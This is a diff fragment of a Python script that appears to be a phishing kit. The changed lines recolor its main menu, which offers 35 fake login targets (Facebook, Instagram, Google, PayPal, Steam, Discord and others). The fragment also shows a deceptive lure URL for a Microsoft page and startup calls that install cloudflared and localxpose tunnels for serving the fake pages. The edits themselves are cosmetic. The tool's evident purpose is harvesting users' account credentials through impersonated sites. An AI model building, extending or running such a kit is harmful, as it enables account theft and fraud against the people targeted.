-{RED}[{WHITE}34{RED}]{ORANGE} Discord       {RED}[{WHITE}35{RED}]{ORANGE} Roblox 
+{DARK}[{WHITE}01{DARK}]{LIGHT2} Facebook      {DARK}[{WHITE}11{DARK}]{LIGHT2} Twitch       {DARK}[{WHITE}21{DARK}]{LIGHT2} DeviantArt
+{DARK}[{WHITE}02{DARK}]{LIGHT2} Instagram     {DARK}[{WHITE}12{DARK}]{LIGHT2} Pinterest    {DARK}[{WHITE}22{DARK}]{LIGHT2} Badoo
+{DARK}[{WHITE}03{DARK}]{LIGHT2} Google        {DARK}[{WHITE}13{DARK}]{LIGHT2} Snapchat     {DARK}[{WHITE}23{DARK}]{LIGHT2} Origin
+{DARK}[{WHITE}04{DARK}]{LIGHT2} Microsoft     {DARK}[{WHITE}14{DARK}]{LIGHT2} Linkedin     {DARK}[{WHITE}24{DARK}]{LIGHT2} DropBox	
+{DARK}[{WHITE}05{DARK}]{LIGHT2} Netflix       {DARK}[{WHITE}15{DARK}]{LIGHT2} Ebay         {DARK}[{WHITE}25{DARK}]{LIGHT2} Yahoo		
+{DARK}[{WHITE}06{DARK}]{LIGHT2} Paypal        {DARK}[{WHITE}16{DARK}]{LIGHT2} Quora        {DARK}[{WHITE}26{DARK}]{LIGHT2} Wordpress
+{DARK}[{WHITE}07{DARK}]{LIGHT2} Steam         {DARK}[{WHITE}17{DARK}]{LIGHT2} Protonmail   {DARK}[{WHITE}27{DARK}]{LIGHT2} Yandex			
+{DARK}[{WHITE}08{DARK}]{LIGHT2} Twitter       {DARK}[{WHITE}18{DARK}]{LIGHT2} Spotify      {DARK}[{WHITE}28{DARK}]{LIGHT2} StackoverFlow
+{DARK}[{WHITE}09{DARK}]{LIGHT2} Playstation   {DARK}[{WHITE}19{DARK}]{LIGHT2} Reddit       {DARK}[{WHITE}29{DARK}]{LIGHT2} Vk
+{DARK}[{WHITE}10{DARK}]{LIGHT2} Tiktok        {DARK}[{WHITE}20{DARK}]{LIGHT2} Adobe        {DARK}[{WHITE}30{DARK}]{LIGHT2} XBOX
+{DARK}[{WHITE}31{DARK}]{LIGHT2} Mediafire     {DARK}[{WHITE}32{DARK}]{LIGHT2} Gitlab       {DARK}[{WHITE}33{DARK}]{LIGHT2} Github
+{DARK}[{WHITE}34{DARK}]{LIGHT2} Discord       {DARK}[{WHITE}35{DARK}]{LIGHT2} Roblox 
 
-{RED}[{WHITE}99{RED}]{ORANGE} About         {RED}[{WHITE}00{RED}]{ORANGE} Exit
+{DARK}[{WHITE}99{DARK}]{LIGHT2} About         {DARK}[{WHITE}00{DARK}]{LIGHT2} Exit
 """)
-    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
+    reply = input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}")
 
     opts = {
         "4": ("microsoft", "https://unlimited-onedrive-space-for-free"),
@@ -834,7 +824,7 @@ def main_menu():
     elif reply in ["0", "00"]:
         msg_exit()
     else:
-        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
         time.sleep(1)
         main_menu()
 
@@ -847,4 +837,4 @@ if __name__ == "__main__":
     install_cloudflared()
     install_localxpose()
     main_menu()
-### lorem ipsum dolor sit amet consectetur adipisicing elit. Voluptas, doloremque! Adipisci, voluptate quisquam. Molestias, consequatur voluptate. Doloribus, neque. Voluptas, doloremque! Adipisci, voluptate quisquam. Molestias, consequatur voluptate. Doloribus, neque.
+
